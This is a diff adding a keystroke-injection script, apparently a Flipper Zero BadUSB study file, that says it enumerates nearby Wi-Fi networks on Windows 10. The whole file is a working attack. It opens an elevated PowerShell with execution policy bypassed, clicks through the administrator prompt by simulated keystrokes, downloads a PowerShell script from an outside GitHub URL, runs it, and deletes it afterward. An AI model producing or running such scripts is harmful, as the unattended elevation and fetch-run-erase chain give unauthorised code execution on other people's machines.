@@ -1,0 +1,33 @@
+REM Script #7: Discovering Nearby Wifi Networks
+REM Desc: Simple enumeration of nearby Wifi networks using Network Shell (netsh)
+REM Author: Ainsley Cabading
+REM Meant for Windows 10
+
+REM Running Powershell as an Admin
+GUI r
+DELAY 200
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass' -Verb RunAs"
+ENTER
+DELAY 1000
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1500
+STRING cd C:\
+ENTER
+
+REM Downloading the nearbyNetworks.ps1 from GitHub and running it
+STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/aenslei/flipperZero-studies/raw/main/Powershell/nearbyNetworks.ps1', 'nearbyNetworks.ps1')
+ENTER
+DELAY 1000
+STRING .\nearbyNetworks.ps1
+ENTER
+
+REM Deleting the nearbyNetworks.ps1
+STRING Remove-Item -path nearbyNetworks.ps1
+ENTER
+DELAY 500
+
+REM Test Case
+STRING echo Script#7 Completed
+ENTER
